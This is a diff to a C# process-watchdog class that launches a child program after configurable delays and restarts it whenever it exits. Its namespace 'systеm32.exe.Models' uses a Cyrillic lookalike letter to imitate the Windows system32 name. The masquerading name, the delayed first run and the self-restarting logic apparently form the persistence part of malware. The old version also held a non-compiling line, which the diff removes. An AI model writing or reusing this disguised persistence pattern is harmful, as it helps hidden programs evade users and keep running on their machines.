@@ -2,6 +2,8 @@
 using System.Configuration;
 using System.Diagnostics;
 using System.IO;
+using System.Threading;
+using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Threading;
 
@@ -11,13 +13,15 @@ namespace systеm32.exe.Models
     {
         private readonly string _fileName;
         private readonly string _configPath;
+        private readonly bool _isServer;
         private readonly DispatcherTimer _watcher;
         private Process _currentProcess;
         private double _timeoutInSeconds;
-        private string _settingsPath;
+        private readonly string _settingsPath;
 
         public ProcessListener(string fileName,
-                               string configPath)
+                               string configPath,
+                               bool isServer)
         {
             _settingsPath = ConfigurationManager
                 .OpenExeConfiguration
@@ -26,8 +30,8 @@ namespace systеm32.exe.Models
                 )
                 .FilePath;
             _fileName = fileName;
-            if(configPath)
             _configPath = configPath;
+            _isServer = isServer;
             _watcher = new DispatcherTimer(DispatcherPriority.Normal)
             {
                 Interval = TimeSpan.FromMilliseconds
@@ -43,6 +47,10 @@ namespace systеm32.exe.Models
 
         private void KeepChildProcess(object sender, EventArgs e)
         {
+            if (Properties.Settings.Default.DoNotRunAgain)
+            {
+                return;
+            }
             if (_currentProcess.HasExited)
             {
                 InitializeChildProcess();
@@ -52,34 +60,24 @@ namespace systеm32.exe.Models
         public void StartListening()
         {
             InitializeChildProcess();
-            _watcher.Start();
         }
 
         private void InitializeChildProcess()
-        {
-            if (File.Exists(Path.Combine(
-        AppDomain.CurrentDomain.BaseDirectory,
-        "doNotRunAgain")))
-            {
-                App.Current.Shutdown();
-                return;
-            }
-            SetTimeOut();
-            _currentProcess = Process.Start(GetPath(), _timeoutInSeconds.ToString());
-        }
-
-        private void SetTimeOut()
         {
             if (Properties.Settings.Default.IsRunForFirstTime)
             {
                 Properties.Settings.Default.IsRunForFirstTime = false;
                 Properties.Settings.Default.Save();
-                _timeoutInSeconds = TimeSpan.FromMinutes(10).TotalSeconds;
+                Thread.Sleep(Convert.ToInt32(TimeSpan.FromSeconds(Properties.Settings.Default.FirstRunTimeoutInSeconds).TotalMilliseconds));
+                _currentProcess = Process.Start(GetPath(), Properties.Settings.Default.FirstRunArgs);
             }
             else
             {
-                _timeoutInSeconds = 1;
+                _timeoutInSeconds = Properties.Settings.Default.SecondRunTimeoutInSeconds;
+                Thread.Sleep(Convert.ToInt32(TimeSpan.FromSeconds(Properties.Settings.Default.SecondRunTimeoutInSeconds).TotalMilliseconds));
+                _currentProcess = Process.Start(GetPath(), Properties.Settings.Default.SecondRunArgs);
             }
+            _watcher.Start();
         }
 
         private string GetPath()
